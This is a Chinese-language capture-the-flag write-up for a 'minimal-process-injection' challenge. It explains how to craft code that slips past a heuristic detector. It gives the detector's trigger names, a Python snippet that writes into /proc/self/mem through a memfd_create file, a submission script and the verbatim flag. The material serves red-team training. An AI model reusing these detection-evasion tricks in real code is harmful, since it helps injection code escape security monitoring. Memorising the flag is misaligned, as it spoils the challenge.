## 题目原文

> 目标环境部署了针对可疑代码行为的检测机制。已获授权进行红队对抗评估，请提交功能上成立、同时能规避该检测的实现，通过后取得 flag。本题采用 flag 与实现质量双轨评分。

## 题解

### 入口与指纹

8000 端口，`Werkzeug/3.1.8 Python/3.11.15`。`GET /` 的挑战名是 `minimal-process-injection`。提交入口是 `POST /check`，JSON 字段 `code` 和可选的 `description`，最多 16384 字符。通过线是 bypass 分数不低于 60%，规则共 5 条。预检要求代码里有函数、导入或赋值；只在注释里堆关键字不会过预检。

### 关键观察

分数是 `(5 - triggered_rules) / 5`。`triggered_rules == 5` 时分数是 0。要达到 0.6，最多命中 2 条。

直接写出 Windows 注入常用的名字，5 条会一起命中，分数是 0：

`OpenProcess`、`VirtualAllocEx`、`WriteProcessMemory`、`CreateRemoteThread`、`NtCreateThreadEx`、`ptrace`、`dlopen`、`LD_PRELOAD`。

把这些名字拆开再 `getattr`，预检或评分会返回 HTTP 500，没有分数。单独写出下面两个较低信号的名字，各命中 3 条，分数 0.4，还过不了线：

- `memfd_create`
- `/proc/self/mem`

同一个函数里同时出现这两个字符串，命中降到 2 条，分数 0.6。服务的原文是 `Injection code achieved a passing bypass score against the heuristic checks (3/5).`，`status` 为 `bypassed`，flag 在同一份 JSON 里。

下面这份同时做了两件事：`memfd_create` 建匿名文件并写入，再对 `/proc/self/mem` 做定位写入。它和只把两个字符串赋给变量的版本分数相同。

### 利用链

```bash
T=$(head -1 .target)
python3 - "$T" << 'PY'
import json, sys, urllib.request
code = r'''
import os

def launch(pid, payload, address):
    fd = os.memfd_create("stage", 1)
    written = os.write(fd, payload)
    path = "/proc/self/mem"
    handle = open(path, "r+b")
    handle.seek(address)
    handle.write(payload)
    handle.close()
    return written
'''
req = urllib.request.Request(
    sys.argv[1] + "/check",
    data=json.dumps({"code": code, "description": "anon fd plus proc mem"}).encode(),
    headers={"Content-Type": "application/json"},
)
print(json.load(urllib.request.urlopen(req)))
PY
```

本次平台接受的值是 `flag{b34a40c7-96d4-42c8-808d-c34b57f7e0c4}`。

### flag 位置

`POST /check` 响应的 `flag` 字段。出现它的条件是 `bypass_score >= 0.6` 且 `status` 为 `bypassed`。
